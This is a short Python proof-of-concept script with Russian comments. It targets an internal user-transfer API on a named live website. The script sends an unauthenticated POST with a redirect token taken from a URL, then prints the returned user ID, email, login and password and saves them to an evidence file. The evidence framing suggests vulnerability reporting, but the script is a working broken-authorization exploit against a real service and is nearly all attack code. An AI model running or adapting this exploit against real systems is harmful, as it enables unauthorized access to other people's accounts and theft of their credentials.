# bug1_poc.py
import requests
import sys

# вставь свой токен из url /transfer?token=XXXXX
REDIRECT_TOKEN = input("вставь redirectToken из url: ").strip()

url = "https://1xlite-03801.world/web-api/api/internal/v1/account/user-transfer/user-data"
headers = {
    "Content-Type": "application/json",
    "Origin": "https://1xlite-03801.world",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}
body = {"redirectToken": REDIRECT_TOKEN}

print(f"\nотправляю запрос без авторизации...")
r = requests.post(url, json=body, headers=headers)

print(f"статус: {r.status_code}")
print(f"server-timing: {r.headers.get('Server-Timing', 'нет')}")
print(f"content-type: {r.headers.get('Content-Type', 'нет')}")
print(f"\nтело ответа:")
print(r.text if r.text else "(пустое тело)")

if r.status_code == 200:
    try:
        data = r.json()
        print("\n=== КРИТИЧНО: данные пользователя получены без авторизации ===")
        print(f"userId:   {data.get('userId', 'N/A')}")
        print(f"email:    {data.get('email', 'N/A')}")
        print(f"login:    {data.get('login', 'N/A')}")
        print(f"password: {data.get('password', 'N/A')}")

        # сохранить как доказательство
        import json
        with open("bug1_evidence.json", "w") as f:
            json.dump({
                "endpoint": url,
                "token_used": REDIRECT_TOKEN[:10] + "...",
                "response_status": r.status_code,
                "user_data": data
            }, f, indent=2, ensure_ascii=False)
        print("\nсохранено в bug1_evidence.json")
    except Exception:
        print("ответ не json:", r.text[:200])
